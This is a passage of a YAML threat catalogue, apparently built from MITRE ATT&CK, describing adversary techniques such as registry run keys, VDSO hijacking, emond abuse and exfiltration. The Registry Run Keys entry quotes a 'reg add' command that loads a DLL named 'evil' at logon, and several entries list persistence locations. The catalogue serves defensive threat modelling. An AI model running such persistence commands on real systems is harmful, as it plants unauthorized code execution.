      \ by administrators using the built-in assoc utility.(Citation: Microsoft Change\
      \ Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc\
      \ Oct 2017) Applications can modify the file association for a given file extension\
      \ to call an arbitrary program when a file with the given extension is opened.\n\
      \nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>,\
      \ for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler\
      \ for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>.\
      \ The various commands are then listed as subkeys underneath the shell key at\
      \ <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For\
      \ example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n\
      * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\\
      txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are\
      \ commands that are executed when the handler opens the file extension. Adversaries\
      \ can modify these values to continually execute arbitrary commands.(Citation:\
      \ TrendMicro TROJ-FAKEAV OCT 2012)\nhttps://attack.mitre.org/techniques/T1546/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.014
    ref_id: T1055.014
    name: VDSO Hijacking
    description: "Adversaries may inject malicious code into processes via VDSO hijacking\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary\
      \ code in the address space of a separate live process. \n\nVDSO hijacking involves\
      \ redirecting calls to dynamically linked shared libraries. Memory protections\
      \ may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008).\
      \ However, an adversary may hijack the syscall interface code stubs mapped into\
      \ a process from the vdso shared object to execute syscalls to open and map\
      \ a malicious shared object. This code can then be invoked by redirecting the\
      \ execution flow of the process via patched memory address references stored\
      \ in a process' global offset table (which store absolute addresses of mapped\
      \ library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace\
      \ VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in\
      \ the context of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via VDSO hijacking\
      \ may also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.002
    ref_id: T1071.002
    name: File Transfer Protocols
    description: "Adversaries may communicate using application layer protocols associated\
      \ with transferring files to avoid detection/network filtering by blending in\
      \ with existing traffic. Commands to the remote system, and often the results\
      \ of those commands, will be embedded within the protocol traffic between the\
      \ client and server. \n\nProtocols such as SMB(Citation: US-CERT TA18-074A),\
      \ FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files\
      \ may be very common in environments.  Packets produced from these protocols\
      \ may have many fields and headers in which data can be concealed. Data could\
      \ also be concealed within the transferred files. An adversary may abuse these\
      \ protocols to communicate with systems under their control within a victim\
      \ network while also mimicking normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1212
    ref_id: T1212
    name: Exploitation for Credential Access
    description: "Adversaries may exploit software vulnerabilities in an attempt to\
      \ collect credentials. Exploitation of a software vulnerability occurs when\
      \ an adversary takes advantage of a programming error in a program, service,\
      \ or within the operating system software or kernel itself to execute adversary-controlled\
      \ code.\_\n\nCredentialing and authentication mechanisms may be targeted for\
      \ exploitation by adversaries as a means to gain access to useful credentials\
      \ or circumvent the process to gain authenticated access to systems. One example\
      \ of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos\
      \ tickets using domain user permissions.(Citation: Technet MS14-068)(Citation:\
      \ ADSecurity Detecting Forged Tickets) Another example of this is replay attacks,\
      \ in which the adversary intercepts data packets sent between parties and then\
      \ later replays these packets. If services don't properly validate authentication\
      \ requests, these replayed packets may allow an adversary to impersonate one\
      \ of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd\
      \ Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight\
      \ Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud\
      \ environments as well. For example, adversaries have exploited vulnerabilities\
      \ in public cloud infrastructure that allowed for unintended authentication\
      \ token creation and renewal.(Citation: Storm-0558 techniques for unauthorized\
      \ email access)\n\nExploitation for credential access may also result in Privilege\
      \ Escalation depending on the process targeted or credentials obtained.\nhttps://attack.mitre.org/techniques/T1212"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.014
    ref_id: T1546.014
    name: Emond
    description: 'Adversaries may gain persistence and elevate privileges by executing
      malicious content triggered by the Event Monitor Daemon (emond). Emond is a
      [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts
      events from various services, runs them through a simple rules engine, and takes
      action. The emond binary at <code>/sbin/emond</code> will load any rules from
      the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly
      defined event takes place.


      The rule files are in the plist format and define the name, event type, and
      action to take. Some examples of event types include system startup and user
      authentication. Examples of actions are to run a system command or send an email.
      The emond service will not launch if there is no file present in the QueueDirectories
      path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)
      configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019)


      Adversaries may abuse this service by writing a rule to execute commands when
      a defined event occurs, such as system start up or user authentication.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019) Adversaries may also be able to escalate privileges
      from administrator to root as the emond service is executed with root privileges
      by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.

      https://attack.mitre.org/techniques/T1546/014'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.003
    ref_id: T1102.003
    name: One-Way Communication
    description: 'Adversaries may use an existing, legitimate external Web service
      as a means for sending commands to a compromised system without receiving return
      output over the Web service channel. Compromised systems may leverage popular
      websites and social media to host command and control (C2) instructions. Those
      infected systems may opt to send the output from those commands back over a
      different C2 channel, including to another distinct Web service. Alternatively,
      compromised systems may return no output at all in cases where adversaries want
      to send instructions to systems and do not want a response.


      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving
      adversaries an added level of protection.

      https://attack.mitre.org/techniques/T1102/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590
    ref_id: T1590
    name: Gather Victim Network Information
    description: 'Adversaries may gather information about the victim''s networks
      that can be used during targeting. Information about networks may include a
      variety of details, including administrative data (ex: IP ranges, domain names,
      etc.) as well as specifics regarding its topology and operations.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about networks may also be exposed to adversaries via online or other accessible
      data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1590'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1210
    ref_id: T1210
    name: Exploitation of Remote Services
    description: "Adversaries may exploit remote services to gain unauthorized access\
      \ to internal systems once inside of a network. Exploitation of a software vulnerability\
      \ occurs when an adversary takes advantage of a programming error in a program,\
      \ service, or within the operating system software or kernel itself to execute\
      \ adversary-controlled code.\_A common goal for post-compromise exploitation\
      \ of remote services is for lateral movement to enable access to a remote system.\n\
      \nAn adversary may need to determine if the remote system is in a vulnerable\
      \ state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046)\
      \ or other Discovery methods looking for common, vulnerable software that may\
      \ be deployed in the network, the lack of certain patches that may indicate\
      \ vulnerabilities,  or security software that may be used to detect or contain\
      \ remote exploitation. Servers are likely a high value target for lateral movement\
      \ exploitation, but endpoint systems may also be at risk if they provide an\
      \ advantage or access to additional resources.\n\nThere are several well-known\
      \ vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple\
      \ SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications\
      \ that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662)\
      \ and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the\
      \ permissions level of the vulnerable remote service an adversary may achieve\
      \ [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)\
      \ as a result of lateral movement exploitation as well.\nhttps://attack.mitre.org/techniques/T1210"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1534
    ref_id: T1534
    name: Internal Spearphishing
    description: 'After they already have access to accounts or systems within the
      environment, adversaries may use internal spearphishing to gain access to additional
      information or compromise other users within the same organization. Internal
      spearphishing is multi-staged campaign where a legitimate account is initially
      compromised either by controlling the user''s device or by compromising the
      account credentials of the user. Adversaries may then attempt to take advantage
      of the trusted internal account to increase the likelihood of tricking more
      victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation:
      Trend Micro - Int SP)


      For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
      or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part
      of internal spearphishing to deliver a payload or redirect to an external site
      to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056)
      on sites that mimic login interfaces.


      Adversaries may also leverage internal chat apps, such as Microsoft Teams, to
      spread malicious content or engage users in attempts to capture sensitive information
      and/or credentials.(Citation: Int SP - chat apps)

      https://attack.mitre.org/techniques/T1534'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.010
    ref_id: T1574.010
    name: Services File Permissions Weakness
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the binaries used by services. Adversaries may use flaws in the permissions
      of Windows services to replace the binary that is executed upon service start.
      These service processes may automatically execute specific binaries as part
      of their functionality or to perform other actions. If the permissions on the
      file system directory containing a target binary, or permissions on the binary
      itself are improperly set, then the target binary may be overwritten with another
      binary using user-level permissions and executed by the original process. If
      the original process and thread are running under a higher permissions level,
      then the replaced binary will also execute under higher-level permissions, which
      could include SYSTEM.


      Adversaries may use this technique to replace legitimate binaries with malicious
      ones as a means of executing code at a higher permissions level. If the executing
      process is set to run at a specific time or during a certain event (e.g., system
      bootup) then this technique can also be used for persistence.

      https://attack.mitre.org/techniques/T1574/010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.001
    ref_id: T1547.001
    name: Registry Run Keys / Startup Folder
    description: 'Adversaries may achieve persistence by adding a program to a startup
      folder or referencing it with a Registry run key. Adding an entry to the "run
      keys" in the Registry or startup folder will cause the program referenced to
      be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.

      https://attack.mitre.org/techniques/T1547/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1199
    ref_id: T1199
    name: Trusted Relationship
    description: 'Adversaries may breach or otherwise leverage organizations who have
      access to intended victims. Access through trusted third party relationship
      abuses an existing connection that may not be protected or receives less scrutiny
      than standard mechanisms of gaining access to a network.


      Organizations often grant elevated access to second or third-party external
      providers in order to allow them to manage internal systems as well as cloud-based
      environments. Some examples of these relationships include IT services contractors,
      managed security providers, infrastructure contractors (e.g. HVAC, elevators,
      physical security). The third-party provider''s access may be intended to be
      limited to the infrastructure being maintained, but may exist on the same network
      as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      used by the other party for access to internal network systems may be compromised
      and used.(Citation: CISA IT Service Providers)


      In Office 365 environments, organizations may grant Microsoft partners or resellers
      delegated administrator permissions. By compromising a partner or reseller account,
      an adversary may be able to leverage existing delegated administrator relationships
      or send new delegated administrator offers to clients in order to gain administrative
      control over the victim tenant.(Citation: Office 365 Delegated Administration)

      https://attack.mitre.org/techniques/T1199'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.003
    ref_id: T1136.003
    name: Cloud Account
    description: 'Adversaries may create a cloud account to maintain access to victim
      systems. With a sufficient level of access, such accounts may be used to establish
      secondary credentialed access that does not require persistent remote access
      tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation:
      Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create
      IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure
      AD Users)


      In addition to user accounts, cloud accounts may be associated with services.
      Cloud providers handle the concept of service accounts in different ways. In
      Azure, service accounts include service principals and managed identities, which
      can be linked to various resources such as OAuth applications, serverless functions,
      and virtual machines in order to grant those resources permissions to perform
      various activities in the environment.(Citation: Microsoft Entra ID Service
      Principals) In GCP, service accounts can also be linked to specific resources,
      as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation:
      GCP Service Accounts) While AWS has no specific concept of service accounts,
      resources can be directly granted permission to assume roles.(Citation: AWS
      Instance Profiles)(Citation: AWS Lambda Execution Role)


      Adversaries may create accounts that only have access to specific cloud services,
      which can reduce the chance of detection.


      Once an adversary has created a cloud account, they can then manipulate that
      account to ensure persistence and allow access to additional resources - for
      example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)
      or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).

      https://attack.mitre.org/techniques/T1136/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.001
    ref_id: T1069.001
    name: Local Groups
    description: 'Adversaries may attempt to find local system groups and permission
      settings. The knowledge of local system permission groups can help adversaries
      determine which groups exist and which users belong to a particular group. Adversaries
      may use this information to determine which users have elevated permissions,
      such as the users found within the local administrators group.


      Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039)
      utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code>
      on Linux can list local groups.

      https://attack.mitre.org/techniques/T1069/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1593
    ref_id: T1593
    name: Search Open Websites/Domains
    description: 'Adversaries may search freely available websites and/or domains
      for information about victims that can be used during targeting. Information
      about victims may be available in various online sites, such as social media,
      new sites, or those hosting information about business operations such as hiring
      or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails
      Google Hacking)(Citation: ExploitDB GoogleHacking)


      Adversaries may search in different online sites depending on what information
      they seek to gather. Information from these sources may reveal opportunities
      for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1593'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098
    ref_id: T1098
    name: Account Manipulation
    description: "Adversaries may manipulate accounts to maintain and/or elevate access\
      \ to victim systems. Account manipulation may consist of any action that preserves\
      \ or modifies adversary access to a compromised account, such as modifying credentials\
      \ or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions\
      \ could also include account activity designed to subvert security policies,\
      \ such as performing iterative password updates to bypass password duration\
      \ policies and preserve the life of compromised credentials. \n\nIn order to\
      \ create or manipulate accounts, the adversary must already have sufficient\
      \ permissions on systems or the domain. However, account manipulation may also\
      \ lead to privilege escalation where modifications grant access to additional\
      \ roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\
      https://attack.mitre.org/techniques/T1098"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048
    ref_id: T1048
    name: Exfiltration Over Alternative Protocol
    description: "Adversaries may steal data by exfiltrating it over a different protocol\
      \ than that of the existing command and control channel. The data may also be\
      \ sent to an alternate network location from the main command and control server.\
      \  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other\
      \ network protocol not being used as the main command and control channel. Adversaries\
      \ may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration\
      \ Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can\
      \ be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB\
      \ or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code>\
      \ may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data\
      \ from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS\
      \ and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub,\
      \ and AWS S3) support the direct download of files, emails, source code, and\
      \ other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).\n\
      https://attack.mitre.org/techniques/T1048"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.006
    ref_id: T1547.006
    name: Kernel Modules and Extensions
    description: "Adversaries may modify the kernel to automatically execute programs\
      \ on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can\
      \ be loaded and unloaded into the kernel upon demand. They extend the functionality\
      \ of the kernel without the need to reboot the system. For example, one type\
      \ of module is the device driver, which allows the kernel to access hardware\
      \ connected to the system.(Citation: Linux Kernel Programming)\_\n\nWhen used\
      \ maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014)\
      \ that run with the highest operating system privilege (Ring 0).(Citation: Linux\
      \ Kernel Module Programming Guide)\_Common features of LKM based rootkits include:\
      \ hiding itself, selective hiding of files, processes and network activity,\
      \ as well as log tampering, providing authenticated backdoors, and enabling\
      \ root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\
      \nKernel extensions, also called kext, are used in macOS to load functionality\
      \ onto a system similar to LKMs for Linux. Since the kernel is responsible for\
      \ enforcing security and the kernel extensions run as apart of the kernel, kexts\
      \ are not governed by macOS security policies. Kexts are loaded and unloaded\
      \ through <code>kextload</code> and <code>kextunload</code> commands. Kexts\
      \ need to be signed with a developer ID that is granted privileges by Apple\
      \ allowing it to sign Kernel extensions. Developers without these privileges\
      \ may still sign kexts but they will not load unless SIP is disabled. If SIP\
      \ is enabled, the kext signature is verified before being added to the AuxKC.(Citation:\
      \ System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel\
      \ extensions have been deprecated in favor of System Extensions. However, kexts\
      \ are still allowed as \"Legacy System Extensions\" since there is no System\
      \ Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension\
      \ Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on\
      \ a system. Examples have been found in the wild, and there are some relevant\
      \ open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike\
      \ Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation:\
      \ RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension\
      \ Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)\nhttps://attack.mitre.org/techniques/T1547/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.002
    ref_id: T1056.002
    name: GUI Input Capture
    description: 'Adversaries may mimic common operating system GUI components to
      prompt users for credentials with a seemingly legitimate prompt. When programs
      are executed that need additional privileges than are present in the current
      user context, it is common for the operating system to prompt the user for proper
      credentials to authorize the elevated privileges for the task (ex: [Bypass User
      Account Control](https://attack.mitre.org/techniques/T1548/002)).


      Adversaries may mimic this functionality to prompt users for credentials with
      a seemingly legitimate prompt for a number of reasons that mimic normal usage,
      such as a fake installer requiring additional access or a fake malware removal
      suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be
      used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation:
      LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing
      credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation:
      LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan
      2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may
      launch dialog boxes prompting users for credentials from malicious shell scripts
      or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation:
      Spoofing credential dialogs)


      Adversaries may also mimic common software authentication requests, such as
      those from browsers or email clients. This may also be paired with user activity
      monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217)
      and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010))
      to spoof prompts when users are naturally accessing sensitive sites/data.

      https://attack.mitre.org/techniques/T1056/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.002
    ref_id: T1588.002
    name: Tool
    description: 'Adversaries may buy, steal, or download software tools that can
      be used during targeting. Tools can be open or closed source, free or commercial.
      A tool can be used for malicious purposes by an adversary, but (unlike malware)
      were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)).
      Tool acquisition can involve the procurement of commercial software licenses,
      including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154).
      Commercial software may be obtained through purchase, stealing licenses (or
      licensed copies of the software), or cracking trial versions.(Citation: Recorded
      Future Beacon 2019)


      Adversaries may obtain tools to support their operations, including to support
      execution of post-compromise behaviors. In addition to freely downloading or
      purchasing software, adversaries may steal software and/or software licenses
      from third-party entities (including other adversaries).

      https://attack.mitre.org/techniques/T1588/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1052.001
    ref_id: T1052.001
    name: Exfiltration over USB
    description: 'Adversaries may attempt to exfiltrate data over a USB connected
      physical device. In certain circumstances, such as an air-gapped network compromise,
      exfiltration could occur via a USB device introduced by a user. The USB device
      could be used as the final exfiltration point or to hop between otherwise disconnected
      systems.

      https://attack.mitre.org/techniques/T1052/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.013
    ref_id: T1574.013
    name: KernelCallbackTable
    description: 'Adversaries may abuse the <code>KernelCallbackTable</code> of a
      process to hijack its execution flow in order to run their own payloads.(Citation:
      Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code>
      can be found in the Process Environment Block (PEB) and is initialized to an
      array of graphic functions available to a GUI process once <code>user32.dll</code>
      is loaded.(Citation: Windows Process Injection KernelCallbackTable)


      An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code>
      by replacing an original callback function with a malicious payload. Modifying
      callback functions can be achieved in various ways involving related behaviors
      such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620)
      or [Process Injection](https://attack.mitre.org/techniques/T1055) into another
      process.


      A pointer to the memory address of the <code>KernelCallbackTable</code> can
      be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code>
      [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation:
      NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code>
      can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>)
      set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>).
      The PEB is then updated with the new address of the table. Once the tampered
      function is invoked, the malicious payload will be triggered.(Citation: Lazarus
      APT January 2022)


      The tampered function is typically invoked using a Windows message. After the
      process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code>
      may also be restored to its original state by the rest of the malicious payload.(Citation:
      Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack
      execution flow may evade detection from security products since the execution
      can be masked under a legitimate process.

      https://attack.mitre.org/techniques/T1574/013'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1597
    ref_id: T1597
    name: Search Closed Sources
    description: 'Adversaries may search and gather information about victims from
      closed (e.g., paid, private, or otherwise not freely available) sources that
      can be used during targeting. Information about victims may be available for
      purchase from reputable private sources and databases, such as paid subscriptions
      to feeds of technical/threat intelligence data. Adversaries may also purchase
      information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation:
      ZDNET Selling Data)


      Adversaries may search in different closed databases depending on what information
      they seek to gather. Information from these sources may reveal opportunities
      for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1597'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.006
    ref_id: T1053.006
    name: Systemd Timers
    description: 'Adversaries may abuse systemd timers to perform task scheduling
      for initial or recurring execution of malicious code. Systemd timers are unit
      files with file extension <code>.timer</code> that control services. Timers
      can be set to run on a calendar event or after a time span relative to a starting
      point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003)
      in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd
      timers may be activated remotely via the <code>systemctl</code> command line
      utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation:
      Systemd Remote Control)


      Each <code>.timer</code> file must have a corresponding <code>.service</code>
      file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>.
      <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002)
      unit files that are managed by the systemd system and service manager.(Citation:
      Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code>
      and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.


      An adversary may use systemd timers to execute malicious code at system startup
